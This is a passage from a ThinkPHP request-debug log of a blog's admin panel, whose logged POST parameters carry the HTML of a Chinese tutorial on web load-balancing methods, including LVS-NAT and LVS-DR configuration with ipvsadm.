[ log ] hhqblog.com/admin/article/add_article.html [运行时间：0.024868s][吞吐率：40.21req/s] [内存消耗：2,989.55kb] [文件加载：51]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'add_article',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://hhqblog.com/admin/article/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335210.1502335210.; _pk_ses.1.3fef=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Article->add_article[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/article/add_article.html [ array (
  0 => 'cates',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000279s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article_cate` [ RunTime:0.000774s ]
[ sql ] [ SQL ] SELECT `id`,`name` FROM `think_article_cate` [ RunTime:0.000221s ]

---------------------------------------------------------------
[ 2017-08-10T11:22:36+08:00 ] 172.17.180.47 123.233.116.122 POST /admin/article/add_article.html
[ log ] hhqblog.com/admin/article/add_article.html [运行时间：0.113538s][吞吐率：8.81req/s] [内存消耗：3,782.98kb] [文件加载：61]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'add_article',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'content-length' => '170641',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'origin' => 'http://hhqblog.com',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'content-type' => 'multipart/form-data; boundary=----WebKitFormBoundarym2iyKKUYJ4AnAyuA',
  'referer' => 'http://hhqblog.com/admin/article/add_article.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335210.1502335210.; _pk_ses.1.3fef=*',
)
[ info ] [ PARAM ] array (
  'title' => '六大Web负载均衡原理与实现',
  'cate_id' => '29',
  'type' => '0',
  'keyword' => '负载均衡,',
  'remark' => '开头先理解一下所谓的“均衡”
不能狭义地理解为分配给所有实际服务器一样多的工作量，因为多台服务器的承载能力各不相同，这可能体现在硬件配置、网络带宽的差异，也可能因为某台服务器身兼多职，我们所说的“均衡”，也就是希望所有服务器都不要过载，并且能够最大程序地发挥作用。',
  'content' => '<p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">开头先理解一下所谓的“均衡”</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">不能狭义地理解为分配给所有实际服务器一样多的工作量，因为多台服务器的承载能力各不相同，这可能体现在硬件配置、网络带宽的差异，也可能因为某台服务器身兼多职，我们所说的“均衡”，也就是希望所有服务器都不要过载，并且能够最大程序地发挥作用。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><h1 style="margin: 0px 0px 0.5em; padding: 0px; color: rgb(51, 51, 51); font-family: Arial; white-space: normal; background-color: rgb(255, 255, 255);"><a target="_blank" style="color: rgb(51, 102, 153);" name="t0"></a><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 14px;">一、http重定向</span></h1><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">当http代理（比如浏览器）向web服务器请求某个URL后，web服务器可以通过http响应头信息中的Location标记来返回一个新的URL。这意味着HTTP代理需要继续请求这个新的URL，完成自动跳转。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">性能缺陷：</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">1、吞吐率限制</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">主站点服务器的吞吐率平均分配到了被转移的服务器。现假设使用RR（Round Robin）调度策略，子服务器的最大吞吐率为1000reqs/s，那么主服务器的吞吐率要达到3000reqs/s才能完全发挥三台子服务器的作用，那么如果有100台子服务器，那么主服务器的吞吐率可想而知得有大？相反，如果主服务的最大吞吐率为6000reqs/s，那么平均分配到子服务器的吞吐率为2000reqs/s，而现子服务器的最大吞吐率为1000reqs/s，因此就得增加子服务器的数量，增加到6个才能满足。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">2、重定向访问深度不同</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">有的重定向一个静态页面，有的重定向相比复杂的动态页面，那么实际服务器的负载差异是不可预料的，而主站服务器却一无所知。因此整站使用重定向方法做负载均衡不太好。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">我们需要权衡转移请求的开销和处理实际请求的开销，前者相对于后者越小，那么重定向的意义就越大，例如下载。你可以去很多镜像下载网站试下，会发现基本下载都使用了Location做了重定向。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><h1 style="margin: 0px 0px 0.5em; padding: 0px; color: rgb(51, 51, 51); font-family: Arial; white-space: normal; background-color: rgb(255, 255, 255);"><a target="_blank" style="color: rgb(51, 102, 153);" name="t1"></a><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 14px;">二、DNS负载均衡</span></h1><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">DNS负责提供域名解析服务，当访问某个站点时，实际上首先需要通过该站点域名的DNS服务器来获取域名指向的IP地址，在这一过程中，DNS服务器完成了域名到IP地址的映射，同样，这样映射也可以是一对多的，这时候，DNS服务器便充当了负载均衡调度器，它就像http重定向转换策略一样，将用户的请求分散到多台服务器上，但是它的实现机制完全不同。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">使用dig命令来看下&quot;baidu&quot;的DNS设置</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;"><img alt="" src="http://img.blog.csdn.net/20141120181216406" style="border: 0px; max-width: 100%;"/><br/></span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">可见baidu拥有三个A记录</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">相比http重定向，基于DNS的负载均衡完全节省了所谓的主站点，或者说DNS服务器已经充当了主站点的职能。但不同的是，作为调度器，DNS服务器本身的性能几乎不用担心。因为DNS记录可以被用户浏览器或者互联网接入服务商的各级DNS服务器缓存，只有当缓存过期后才会重新向域名的DNS服务器请求解析。也说是DNS不存在http的吞吐率限制，理论上可以无限增加实际服务器的数量。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">特性:</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">1、可以根据用户IP来进行<a href="http://lib.csdn.net/base/aiplanning" class="replace_word" title="人工智能规划与决策知识库" target="_blank" style="color: rgb(223, 52, 52); text-decoration-line: none; font-weight: bold;">智能</a>解析。DNS服务器可以在所有可用的A记录中寻找离用记最近的一台服务器。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">2、动态DNS：在每次IP地址变更时，及时更新DNS服务器。当然，因为缓存，一定的延迟不可避免。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">不足：</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">1、没有用户能直接看到DNS解析到了哪一台实际服务器，加服务器运维人员的调试带来了不便。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">2、策略的局限性。例如你无法将HTTP请求的上下文引入到调度策略中，而在前面介绍的基于HTTP重定向的负载均衡系统中，调度器工作在HTTP层面，它可以充分理解HTTP请求后根据站点的应用逻辑来设计调度策略，比如根据请求不同的URL来进行合理的过滤和转移。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">3、如果要根据实际服务器的实时负载差异来调整调度策略，这需要DNS服务器在每次解析操作时分析各服务器的健康状态，对于DNS服务器来说，这种自定义开发存在较高的门槛，更何况大多数站点只是使用第三方DNS服务。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">4、DNS记录缓存，各级节点的DNS服务器不同程序的缓存会让你晕头转向。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">5、基于以上几点，DNS服务器并不能很好地完成工作量均衡分配，最后，是否选择基于DNS的负载均衡方式完全取决于你的需要。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><h1 style="margin: 0px 0px 0.5em; padding: 0px; color: rgb(51, 51, 51); font-family: Arial; white-space: normal; background-color: rgb(255, 255, 255);"><a target="_blank" style="color: rgb(51, 102, 153);" name="t2"></a><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 14px;">三、反向代理负载均衡</span></h1><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">这个肯定大家都有所接触，因为几乎所有主流的Web服务器都热衷于支持基于反向代理的负载均衡。它的核心工作就是转发HTTP请求。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">相比前面的HTTP重定向和DNS解析，反向代理的调度器扮演的是用户和实际服务器中间人的角色：</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">1、任何对于实际服务器的HTTP请求都必须经过调度器</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">2、调度器必须等待实际服务器的HTTP响应，并将它反馈给用户（前两种方式不需要经过调度反馈，是实际服务器直接发送给用户）</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">特性：</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">1、调度策略丰富。例如可以为不同的实际服务器设置不同的权重，以达到能者多劳的效果。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">2、对反向代理服务器的并发处理能力要求高，因为它工作在HTTP层面。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">3、反向代理服务器进行转发操作本身是需要一定开销的，比如创建线程、与后端服务器建立TCP连接、接收后端服务器返回的处理结果、分析HTTP头部信息、用户空间和内核空间的频繁切换等，虽然这部分时间并不长，但是当后端服务器处理请求的时间非常短时，转发的开销就显得尤为突出。例如请求静态文件，更适合使用前面介绍的基于DNS的负载均衡方式。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">4、反向代理服务器可以监控后端服务器，比如系统负载、响应时间、是否可用、TCP连接数、流量等，从而根据这些数据调整负载均衡的策略。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">5、反射代理服务器可以让用户在一次会话周期内的所有请求始终转发到一台特定的后端服务器上（粘滞会话），这样的好处一是保持session的本地访问，二是防止后端服务器的动态内存缓存的资源浪费。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><h1 style="margin: 0px 0px 0.5em; padding: 0px; color: rgb(51, 51, 51); font-family: Arial; white-space: normal; background-color: rgb(255, 255, 255);"><a target="_blank" style="color: rgb(51, 102, 153);" name="t3"></a><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 14px;">四、IP负载均衡(LVS-NAT)</span></h1><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">因为反向代理服务器工作在HTTP层，其本身的开销就已经严重制约了可扩展性，从而也限制了它的性能极限。那能否在HTTP层面以下实现负载均衡呢？</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">NAT服务器:它工作在传输层，它可以修改发送来的IP数据包，将数据包的目标地址修改为实际服务器地址。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">从Linux2.4内核开始，其内置的Neftilter模块在内核中维护着一些数据包过滤表，这些表包含了用于控制数据包过滤的规则。可喜的是，<a href="http://lib.csdn.net/base/linux" class="replace_word" title="Linux知识库" target="_blank" style="color: rgb(223, 52, 52); text-decoration-line: none; font-weight: bold;">Linux</a>提供了iptables来对过滤表进行插入、修改和删除等操作。更加令人振奋的是，Linux2.6.x内核中内置了IPVS模块，它的工作性质类型于Netfilter模块，不过它更专注于实现IP负载均衡。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">想知道你的服务器内核是否已经安装了IPVS模块，可以</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;"><img alt="" src="http://img.blog.csdn.net/20141121164600671" style="border: 0px; max-width: 100%;"/><br/></span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">有输出意味着IPVS已经安装了。IPVS的管理工具是ipvsadm，它为提供了基于命令行的配置界面，可以通过它快速实现负载均衡系统。这就是大名鼎鼎的LVS(<a href="http://lib.csdn.net/base/linux" class="replace_word" title="Linux知识库" target="_blank" style="color: rgb(223, 52, 52); text-decoration-line: none; font-weight: bold;">linux</a>&nbsp;Virtual Server，Linux虚拟服务器)。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">1、打开调度器的数据包转发选项</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">2、检查实际服务器是否已经将NAT服务器作为自己的默认网关，如果不是，如添加</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">route add default gw xx.xx.xx.xx</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">3、使用ipvsadm配置</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">ipvsadm -A -t 111.11.11.11:80 -s rr &nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">添加一台虚拟服务器，-t 后面是服务器的外网ip和端口，-s rr是指采用简单轮询的RR调度策略（这属于静态调度策略，除此之外，LVS还提供了系列的动态调度策略，比如最小连接（LC）、带权重的最小连接（WLC），最短期望时间延迟（SED）等）</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">ipvsadm -a -t 111.11.11.11:80 -r 10.10.120.210:8000 -m &nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">ipvsadm -a -t 111.11.11.11:80 -r 10.10.120.211:8000 -m &nbsp;<br/></span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">添加两台实际服务器（不需要有外网ip），-r后面是实际服务器的内网ip和端口，-m表示采用NAT方式来转发数据包</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">运行ipvsadm -L -n可以查看实际服务器的状态。这样就大功告成了。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">实验证明使用基于NAT的负载均衡系统。作为调度器的NAT服务器可以将吞吐率提升到一个新的高度，几乎是反向代理服务器的两倍以上，这大多归功于在内核中进行请求转发的较低开销。但是一旦请求的内容过大时，不论是基于反向代理还是NAT，负载均衡的整体吞吐量都差距不大，这说明对于一睦开销较大的内容，使用简单的反向代理来搭建负载均衡系统是值考虑的。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">这么强大的系统还是有它的瓶颈，那就是NAT服务器的网络带宽，包括内部网络和外部网络。当然如果你不差钱，可以去花钱去购买千兆交换机或万兆交换机，甚至负载均衡硬件设备，但如果你是个屌丝，咋办？</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">一个简单有效的办法就是将基于NAT的集群和前面的DNS混合使用，比如５个100Mbps出口宽带的集群，然后通过DNS来将用户请求均衡地指向这些集群，同时，你还可以利用DNS智能解析实现地域就近访问。这样的配置对于大多数业务是足够了，但是对于提供下载或视频等服务的大规模站点，NAT服务器还是不够出色。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><h1 style="margin: 0px 0px 0.5em; padding: 0px; color: rgb(51, 51, 51); font-family: Arial; white-space: normal; background-color: rgb(255, 255, 255);"><a target="_blank" style="color: rgb(51, 102, 153);" name="t4"></a><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 14px;">五、直接路由(LVS-DR)</span></h1><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">NAT是工作在网络分层模型的传输层（第四层），而直接路由是工作在数据链路层（第二层），貌似更屌些。它通过修改数据包的目标MAC地址（没有修改目标IP），将数据包转发到实际服务器上，不同的是，实际服务器的响应数据包将直接发送给客户羰，而不经过调度器。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">1、网络设置</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">这里假设一台负载均衡调度器，两台实际服务器，购买三个外网ip，一台机一个，三台机的默认网关需要相同，最后再设置同样的ip别名，这里假设别名为10.10.120.193。这样一来，将通过10.10.120.193这个IP别名来访问调度器，你可以将站点的域名指向这个IP别名。</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">2、将ip别名添加到回环接口lo上</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">这是为了让实际服务器不要去寻找其他拥有这个IP别名的服务器，在实际服务器中运行：</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;"><img alt="" src="http://img.blog.csdn.net/20141121180709578" style="border: 0px; max-width: 100%;"/><br/></span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">另外还要防止实际服务器响应来自网络中针对IP别名的ARP广播，为此还要执行：</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">echo &quot;1&quot; &gt; /proc/sys/net/ipv4/conf/lo/arp_ignore</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">echo &quot;2&quot; &gt; /proc/sys/net/ipv4/conf/lo/arp_announce<br/></span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">echo &quot;1&quot; &gt; /proc/sys/net/ipv4/conf/all/arp_ignore<br/></span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">echo &quot;1&quot; &gt; /proc/sys/net/ipv4/conf/all/arp_announce<br/></span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">配置完了就可以使用ipvsadm配置LVS-DR集群了</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">ipvsadm -A -t 10.10.120.193:80 -s rr &nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">ipvsadm -a -t&nbsp;10.10.120.193:80 -r 10.10.120.210:8000 -g &nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);"><span style="font-family: &quot;Microsoft YaHei&quot;;">ipvsadm -a -t&nbsp;10.10.120.193:80 -r 10.10.120.211:8000 -g &nbsp;</span></p><p style="color: rgb(51, 51, 51); font-family: Arial; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 